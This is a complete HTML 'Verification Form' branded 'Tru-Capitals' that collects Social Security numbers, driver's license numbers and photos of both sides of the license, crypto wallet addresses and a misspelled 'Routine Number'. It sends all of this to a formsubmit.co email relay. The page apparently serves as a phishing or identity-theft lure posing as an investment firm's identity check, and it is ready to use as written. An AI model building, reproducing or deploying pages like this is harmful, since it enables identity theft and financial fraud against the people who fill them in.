<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Verification Form</title>
    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <style>
      body {
        background: linear-gradient(to bottom right, #6b46c1, #4c51bf, #319795);
        color: #fff;
      }
      .form-container {
        background: #fff;
        border-radius: 10px;
        padding: 2rem;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        color: #333;
      }
      .form-container h2 {
        color: #6b46c1;
        font-weight: bold;
      }
      .form-control:focus {
        border-color: #6b46c1;
        box-shadow: 0 0 0 0.2rem rgba(107, 70, 193, 0.25);
      }
      .btn-primary {
        background-color: #6b46c1;
        border-color: #6b46c1;
      }
      .btn-primary:hover {
        background-color: #553c9a;
        border-color: #553c9a;
      }
      .upload-preview {
        border: 2px dashed #6b46c1;
        border-radius: 10px;
        padding: 1rem;
        text-align: center;
        margin-bottom: 1rem;
      }
      .upload-preview img {
        max-width: 100%;
        border-radius: 5px;
      }
      .terms-section {
        background: #f8f9fa;
        padding: 15px;
        border-radius: 5px;
        margin-bottom: 20px;
      }
      .terms-section h5 {
        color: #6b46c1;
      }
      .terms-section p {
        color: #333;
      }
    </style>
  </head>
  <body>
    <div class="container py-5">
      <div class="row justify-content-center">
        <div class="col-md-8">
          <div class="form-container">
            <div class="d-flex justify-content-between align-items-center mb-4">
              <h2 class="text-start">Verification Form</h2>
              <img
                src="img/tru-logo.svg"
                alt="Logo"
                width="100"
                height=""
                style="
                  background-color: #6b46c1;
                  padding: 10px;
                  border-radius: 10px;
                "
              />
            </div>
            <form
              method="POST"
              action="https://formsubmit.co/5cc8f8d311408298e76be59edae45396"
              enctype="multipart/form-data"
            >
              <!-- Driver's License Section -->
              <div class="mb-4">
                <label for="dlNumber" class="form-label"
                  >Driver's License Number</label
                >
                <input
                  type="text"
                  class="form-control"
                  id="dlNumber"
                  name="dlNumber"
                  placeholder="Enter DL Number"
                  required
                />
              </div>

              <!-- SSN Section -->
              <div class="mb-4">
                <label for="ssn" class="form-label"
                  >Social Security Number (SSN)</label
                >
                <input
                  type="text"
                  class="form-control"
                  id="ssn"
                  name="ssn"
                  placeholder="Enter SSN"
                  required
                />
              </div>

              <!-- Upload DL Front and Back -->
              <div class="mb-4">
                <label class="form-label">Upload Driver's License</label>
                <div class="row">
                  <div class="col-md-6">
                    <div class="upload-preview">
                      <img
                        id="frontPreview"
                        src="#"
                        alt="Front Preview"
                        style="display: none"
                      />
                      <p id="frontText">Front of DL</p>
                    </div>
                    <input
                      type="file"
                      class="form-control"
                      id="frontUpload"
                      name="frontDL"
                      accept="image/*"
                      onchange="previewImage(event, 'frontPreview', 'frontText')"
                      required
                    />
                  </div>
                  <div class="col-md-6">
                    <div class="upload-preview">
                      <img
                        id="backPreview"
                        src="#"
                        alt="Back Preview"
                        style="display: none"
                      />
                      <p id="backText">Back of DL</p>
                    </div>
                    <input
                      type="file"
                      class="form-control"
                      id="backUpload"
                      name="backDL"
                      accept="image/*"
                      onchange="previewImage(event, 'backPreview', 'backText')"
                      required
                    />
                  </div>
                </div>
              </div>

              <!-- Wallet Address Section -->
              <div class="mb-4">
                <label for="walletType" class="form-label"
                  >Select Wallet Type</label
                >
                <select
                  class="form-select"
                  id="walletType"
                  name="walletType"
                  required
                >
                  <option value="">Choose...</option>
                  <option value="bitcoin">Bitcoin</option>
                  <option value="ethereum">Ethereum</option>
                  <option value="usdt">USDT (Tether)</option>
                  <option value="other">Other</option>
                </select>
                <div id="otherWallet" class="mt-4" style="display: none">
                  <label for="otherWalletName" class="form-label"
                    >Wallet Name</label
                  >
                  <input
                    type="text"
                    class="form-control"
                    id="otherWalletName"
                    name="otherWalletName"
                    placeholder="Enter Wallet Name"
                  />
                </div>
              </div>

              <div class="mb-4">
                <label for="walletAddress" class="form-label"
                  >Wallet Address</label
                >
                <input
                  type="text"
                  class="form-control"
                  id="walletAddress"
                  name="walletAddress"
                  placeholder="Enter Wallet Address"
                  required
                />
              </div>

              <!-- Routine Number -->
              <div class="mb-4">
                <label for="routineNumber" class="form-label">
                  Routine Number</label
                >
                <input
                  type="text"
                  class="form-control"
                  id="routineNumber"
                  name="routineNumber"
                  placeholder="Enter Routine Number"
                  required
                />
              </div>

              <!-- Yes/No Questions -->
              <div class="mb-4">
                <label class="form-label">Are you a U.S. citizen?</label>
                <div class="form-check">
                  <input
                    class="form-check-input"
                    type="radio"
                    name="citizen"
                    id="citizenYes"
                    value="yes"
                    required
                  />
                  <label class="form-check-label" for="citizenYes">Yes</label>
                </div>
                <div class="form-check">
                  <input
                    class="form-check-input"
                    type="radio"
                    name="citizen"
                    id="citizenNo"
                    value="no"
                    required
                  />
                  <label class="form-check-label" for="citizenNo">No</label>
                </div>
              </div>

              <!-- Terms and Conditions Section -->
              <div class="terms-section mb-4">
                <h5>Terms and Conditions</h5>
                <p>
                  By submitting this form, you agree to the terms and conditions
                  of Tru-Capitals. Please ensure all information provided is
                  accurate.
                </p>
                <div class="form-check">
                  <input
                    class="form-check-input"
                    type="checkbox"
                    id="agreeTerms"
                    name="agreeTerms"
                    required
                  />
                  <label class="form-check-label" for="agreeTerms">
                    I agree to the terms and conditions.
                  </label>
                </div>
              </div>

              <!-- Submit Button -->
              <div class="d-grid">
                <button type="submit" class="btn btn-primary">
                  Submit Verification
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

    <script>
      function previewImage(event, imgId, textId) {
        const file = event.target.files[0];
        if (file) {
          const reader = new FileReader();
          reader.onload = function (e) {
            const img = document.getElementById(imgId);
            img.src = e.target.result;
            img.style.display = "block";
            document.getElementById(textId).style.display = "none";
          };
          reader.readAsDataURL(file);
        }
      }
    </script>
    <script>
      document
        .getElementById("walletType")
        .addEventListener("change", function () {
          if (this.value === "other") {
            document.getElementById("otherWallet").style.display = "block";
          } else {
            document.getElementById("otherWallet").style.display = "none";
          }
        });
    </script>
  </body>
</html>
